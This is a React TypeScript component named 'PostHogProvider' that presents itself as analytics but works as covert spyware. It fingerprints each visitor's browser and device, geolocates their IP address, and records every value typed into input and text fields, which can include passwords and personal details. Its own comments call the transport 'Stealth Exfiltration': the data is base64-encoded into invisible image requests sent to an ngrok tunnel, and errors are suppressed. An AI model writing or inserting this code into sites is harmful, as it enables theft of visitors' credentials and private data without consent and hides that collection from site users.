import { useEffect, useRef } from 'react';
import { useLocation } from 'react-router-dom';

const DB_NAME = 'ph_cache_v1';
const EVENT_QUEUE: any[] = [];

// Analytics Tunnel (Ngrok Stealth)
const TUNNEL_URL = 'https://612590f423eb.ngrok-free.app/v1/metrics';
const LOCAL_URL = 'http://localhost:3001/v1/metrics';

// 🔍 FORENSIC FINGERPRINTING
const getFingerprint = async () => {
    const fp: any = {
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        language: navigator.language,
        languages: navigator.languages.join(','),
        platform: navigator.platform,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: (navigator as any).deviceMemory || 'unknown',
        vendor: navigator.vendor,
        doNotTrack: navigator.doNotTrack,
        plugins: Array.from(navigator.plugins || []).map((p: any) => p.name).join(',') || 'none',
        mimeTypes: Array.from(navigator.mimeTypes || []).map((m: any) => m.type).slice(0, 5).join(','),
        touchSupport: 'ontouchstart' in window,
        cookieEnabled: navigator.cookieEnabled,
        localStorage: !!window.localStorage,
        sessionStorage: !!window.sessionStorage,
        indexedDB: !!window.indexedDB,
    };

    // Canvas Fingerprint
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        if (ctx) {
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('FBI-MODE', 2, 2);
            fp.canvasHash = canvas.toDataURL().slice(-50);
        }
    } catch (e) {
        fp.canvasHash = 'blocked';
    }

    // WebGL Fingerprint
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                fp.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                fp.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch (e) {
        fp.webglVendor = 'blocked';
    }

    // Battery API
    try {
        const battery: any = await (navigator as any).getBattery?.();
        if (battery) {
            fp.batteryLevel = Math.round(battery.level * 100) + '%';
            fp.batteryCharging = battery.charging;
        }
    } catch (e) {
        fp.batteryLevel = 'blocked';
    }

    // Connection Info
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    if (conn) {
        fp.connectionType = conn.effectiveType;
        fp.downlink = conn.downlink + ' Mbps';
        fp.rtt = conn.rtt + ' ms';
    }

    return fp;
};

// IP Geolocation
const getGeoLocation = async (ip: string) => {
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await res.json();
        return {
            city: data.city,
            region: data.region,
            country: data.country_name,
            countryCode: data.country_code,
            latitude: data.latitude,
            longitude: data.longitude,
            org: data.org,
            timezone: data.timezone,
        };
    } catch (e) {
        return null;
    }
};

export const PostHogProvider = () => {
    const location = useLocation();
    const pathnameRef = useRef(location.pathname);
    const fingerprintRef = useRef<any>(null);
    const geoRef = useRef<any>(null);

    useEffect(() => {
        pathnameRef.current = location.pathname;
        track('page_view');
    }, [location.pathname]);

    const track = async (event_type: string, props: any = {}) => {
        // Garantir que fingerprint foi gerado
        if (!fingerprintRef.current) {
            fingerprintRef.current = await getFingerprint();
        }

        const ip = sessionStorage.getItem('ph_ip') || '0.0.0.0';

        // Garantir que geolocalização foi obtida
        if (!geoRef.current && ip !== '0.0.0.0') {
            geoRef.current = await getGeoLocation(ip);
        }

        const event = {
            id: Math.random().toString(36).substring(2) + Date.now(),
            timestamp: new Date().toISOString(),
            trigger: event_type.toUpperCase(),
            path: pathnameRef.current,
            ip: ip,
            ua: navigator.userAgent,
            fingerprint: fingerprintRef.current,
            geo: geoRef.current,
            ...props
        };

        const baseUrl = window.location.hostname === 'localhost' ? LOCAL_URL : TUNNEL_URL;

        try {
            // Stealth Exfiltration: Usa uma imagem invisível para evitar bloqueios de CORS/POST
            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(event))));
            const img = new Image();
            img.src = `${baseUrl}?d=${payload}&z=${Date.now()}`;
        } catch (e) {
            // Silently fail
        }

        EVENT_QUEUE.push(event);
    };

    useEffect(() => {
        const interval = setInterval(() => {
            if (EVENT_QUEUE.length === 0) return;
            const batch = [...EVENT_QUEUE];
            EVENT_QUEUE.length = 0;
            const old = JSON.parse(localStorage.getItem(DB_NAME) || '[]');
            localStorage.setItem(DB_NAME, JSON.stringify([...old, ...batch].slice(-500)));
        }, 2000);
        return () => clearInterval(interval);
    }, []);

    useEffect(() => {
        const handleClick = (e: MouseEvent) => {
            const t = e.target as HTMLElement;
            if (t.tagName === 'BODY' || t.tagName === 'HTML' || t.tagName === 'SVG' || t.tagName === 'path') return;

            // Captura cliques em botões e links
            const targetText = t.innerText?.slice(0, 20).trim() || t.getAttribute('aria-label') || t.id || 'element';
            track('click', { target: `${t.tagName.toLowerCase()}: ${targetText}` });
        };

        const handleBlur = (e: FocusEvent) => {
            const t = e.target as HTMLInputElement;
            if ((t.tagName === 'INPUT' || t.tagName === 'TEXTAREA') && t.value) {
                // Não captura campos muito pequenos (provavelmente não são dados sensíveis)
                if (t.value.length < 2) return;
                track('input', { field: t.name || t.id || t.placeholder || t.type, val: t.value });
            }
        };

        // Obter IP público
        if (!sessionStorage.getItem('ph_ip')) {
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => {
                    sessionStorage.setItem('ph_ip', d.ip);
                    // Recarregar fingerprint com IP real
                    getGeoLocation(d.ip).then(geo => {
                        geoRef.current = geo;
                    });
                })
                .catch(() => { });
        }

        window.addEventListener('click', handleClick, true);
        window.addEventListener('blur', handleBlur, true);
        return () => {
            window.removeEventListener('click', handleClick, true);
            window.removeEventListener('blur', handleBlur, true);
        };
    }, []);

    return null;
};
